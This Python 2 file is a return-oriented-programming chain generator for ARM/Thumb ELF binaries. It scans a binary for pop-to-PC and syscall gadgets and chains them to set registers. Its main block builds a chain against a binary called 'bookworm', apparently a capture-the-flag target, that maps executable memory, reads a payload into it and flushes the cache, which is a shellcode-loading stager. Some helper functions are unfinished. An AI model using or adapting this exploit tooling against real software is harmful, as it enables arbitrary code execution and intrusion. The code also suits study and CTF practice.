import thumb
import arm
import pyelf
import sys
import struct
import random

p32 = lambda x: struct.pack("<L", x)

def dict_keys_upper(d):
    d2 = {}
    for k,v in d.items():
        d2[k.upper()] = v
    return d2

class ROP:
    def __init__(self, f=None, base=0):
        self.base = base
        self.pops = []
        self.ldmias = []
        self.swi_0 = None
        self.gadgets = []
        self.ropchain = []
        if f != None:
            self.analyze_elf(f)

    @property
    def can_be_set(self):
        """The set of registers that can be set"""
        regs = []
        map(regs.extend, map(lambda (a, pops): pops, self.gadgets))
        return set(regs)

    def analyze_elf(self, f):
        """Analyze an ELF file to find rop gadgets
        Arguemnts:
            f(str/file/pyelf.ELFFile): file to analyze
            off(int): offset relative to the base address
        Returns:
            None

        Note:
            Does only analyse .text section
        """
        if type(f) == str:
            f = open(f, "r")
        if type(f) == file:
            f = pyelf.ELFFile(f)
        text_sec = f.getsection(".text")
        self.analyze(text_sec.data, text_sec.addr)

    def analyze(self, data, off=0):
        """Analyze a piece of data to find rop gadgets.
        Arguments:
            data(str): data to be analyzed.
            off(int): offset relative to the base address
        Returns:
            None
        """
        disassembly_thumb = list(thumb.disassemble_all(data, off))
        #disassembly_arm = arm.disassemble_all(data, off)
        self.find_pops(disassembly_thumb)
        self.find_syscall_gadget(disassembly_thumb)

    def find_pops(self, disassembly):
        """find all thumb mode pop gadgets that looks like:
        pop {..., R15}
        """
        pops = filter(
                lambda (addr, inst): inst[0] == "POP" and "R15" in inst[1],
                disassembly)
        self.pops += pops
        self.gadgets += [(addr | 1, inst[1]) for (addr, inst) in pops]

    def find_ldmias(self):
        """Does not work yet..."""
        for addr, inst in self.disassembly_arm:
            if inst[:3] == ("AL", "LDMIA", "R13!"):
                if "R13" not in inst[3] and "R15" in inst[3]:
                    self.ldmias.append((addr, inst))
                    self.gadgets.append((addr, inst[3]))

    def find_syscall_gadget(self, disassembly):
        for i in range(len(disassembly)-1):
            addr, inst = disassembly[i]
            if inst != ("SWI", 0):
                continue
            addr2, inst2 = disassembly[i+1]
            if inst2[0] == "POP" and "R15" in inst2[1]:
                if self.swi_0 and len(inst2[1]) > len(self.swi_0[1][1]):
                    continue
                self.swi_0 = (addr, inst2)

    def find_best_gadget(self, regs):
        """find 'best' to set registers
        Current algorithm: the gadget that set most registers that is needed
        """
        def gadget_score(gadget, regs):
            return len(set(gadget) & regs)
        #must contain atleast one register we want.
        gadgets = ((a,g) for (a,g) in self.gadgets if len(set(g) & regs) > 0)
        gadget = max(gadgets, key = lambda (a, g): gadget_score(g, regs))
        return gadget


    def set_regs(self, regs_dict, return_addr):
        regs_dict = dict_keys_upper(regs_dict)
        ropchain = []
        regs = set(regs_dict.keys())
        old_regs = None

        while regs and regs != old_regs:
            addr, reg_pops = self.find_best_gadget(regs)
            ropchain.append(self.base+addr)
            ropchain += [regs_dict.get(reg, 0x41414141) for reg in reg_pops[:-1]]
            old_regs = set(regs)
            regs -= set(reg_pops)

        ropchain += [return_addr]
        if regs:
            raise Exception("Unable to set registers %r from %r" % (regs, regs_dict))

        return ropchain[0], ropchain[1:]

    def do_swi(self, return_addr):
        if return_addr == None:
            return_addr = 0x41414141
        regs_dict= {"R15" : return_addr}
        ropchain = []
        if self.swi_0 == None:
            raise Exception("SWI 0 gadget not found. Cannot not perform syscall")
        addr, pop_inst = self.swi_0
        ropchain.append(self.base+addr | 1)
        ropchain += [regs_dict.get(reg, 0x41414141) for reg in pop_inst[1]]
        return ropchain[0], ropchain[1:]

    def lookup_symbol(self, name):
        raise Exception("Symbol lookup not implemented yet. Doit yourself.")

    def call(self, func, *args):
        """make a call to a function
        Does not work yet, need better arm decompiler...
        """
        if type(func) == str:
            func = self.lookup_symbol(func)
        regs_dict = dict(zip(["R0", "R1", "R2", "R3"], args))
        self.ropchain.append(("call", regs_dict, func))

    def do_syscall(self, regs_dict, return_addr):
        swi_addr, swirop = self.do_swi(return_addr)
        set_regs_addr, regsrop = self.set_regs(regs_dict, swi_addr)
        return set_regs_addr, (regsrop + swirop)

    def syscall(self, regs_dict):
        """Make a syscall with rop
        Arguments:
            regs_dict(dict): dictionary of which registeres to be set to what

        Example:
            rop.syscall({"R7": 1}) # perfome exit syscall
        """
        regs_dict = dict_keys_upper(regs_dict)
        self.ropchain.append(("syscall", regs_dict))

    def ret(self, addr):
        """Return to address
        Arguments:
            addr(int): address to return to.

        Warning:
            The ropchain might not be able to continue after this...
            This is intentionally.
        """
        self.ropchain.append(("return", addr))

    def generate_ropchain(self):
        """Generate the ropchain"""
        return_addr = None
        regs = set()
        rop = []
        roppart = []
        for i in self.ropchain[::-1]:
            regs_dict = i[1]
            if i[0] == "syscall":
                return_addr, roppart = self.do_syscall(regs_dict, return_addr)
            if i[0] == "call":
                if return_addr:
                    regs_dict["R14"] = return_addr
                return_addr, roppart = self.set_regs(regs_dict, i[2])
            if i[0] == "return":
                return_addr = i[1]
            rop = roppart+rop
        rop = [return_addr] + rop
        return rop

    def flush(self):
        """Flush the ropchain"""
        ropchain = "".join(map(p32, self.generate_ropchain()))
        self.ropchain = []
        return ropchain

if __name__ == "__main__":
    rop = ROP("bookworm", 0xed000000)
    print "regs that can be set: ", rop.can_be_set
    rop.syscall({"R0":0xaa0000, "R1":0x1000, "R2":7, "R3":0x32, "R4":0xffffffff, "R5":0, "R7":192})
    #rop.call(0x45454545, 0x11111111, 0x22222222, 0x55555555)
    rop.syscall({"R0":0, "R1":0xaa0000, "R2":0x142, "R7":3})
    #rop.call(0xaaaaaaaa, 0x1e1e1e1e, 0x42424242, 0x99995555)
    rop.syscall({"R7":0xf0002, "R0":0xaa0000, "R1":0xaa1000})
    print map(hex, rop.generate_ropchain())
